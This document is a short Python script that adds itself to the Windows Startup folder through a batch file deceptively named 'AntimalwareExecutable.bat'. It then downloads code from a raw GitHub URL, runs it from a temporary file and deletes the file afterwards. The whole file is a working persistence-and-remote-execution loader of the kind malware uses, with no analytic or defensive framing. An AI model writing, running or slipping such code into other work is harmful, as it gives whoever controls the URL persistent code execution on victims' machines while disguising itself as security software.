import os
import requests
import sys
import tempfile

def add_to_startup():
    """Add this script to the Windows Startup folder once."""
    startup_dir = os.path.join(
        os.environ["APPDATA"], "Microsoft", "Windows", "Start Menu", "Programs", "Startup"
    )
    script_path = os.path.abspath(__file__)
    bat_path = os.path.join(startup_dir, "AntimalwareExecutable.bat")

    if not os.path.exists(bat_path):  # only add once
        with open(bat_path, "w") as bat_file:
            bat_file.write(f'@echo off\npython "{script_path}"\n')
        print(f"Added to startup: {bat_path}")
    else:
        print("Already in startup.")

def run_remote_code(url):
    """Download and run Python code from a URL, then clean up."""
    try:
        response = requests.get(url)
        response.raise_for_status()
        code = response.text

        # Save code to a temporary file
        temp_file = tempfile.NamedTemporaryFile(delete=False, suffix=".py")
        temp_file.write(code.encode())
        temp_file.close()

        # Run the temporary file
        print(f"Running remote code from {url}...\n")
        os.system(f'python "{temp_file.name}"')

        # Delete after execution
        os.remove(temp_file.name)
        print(f"Deleted temp file: {temp_file.name}")

    except Exception as e:
        print("Error fetching or running remote code:", e)

if __name__ == "__main__":
    add_to_startup()
    github_url = "https://raw.githubusercontent.com/KTDeboa/scwebsiteslist/refs/heads/main/stup"
    run_remote_code(github_url)
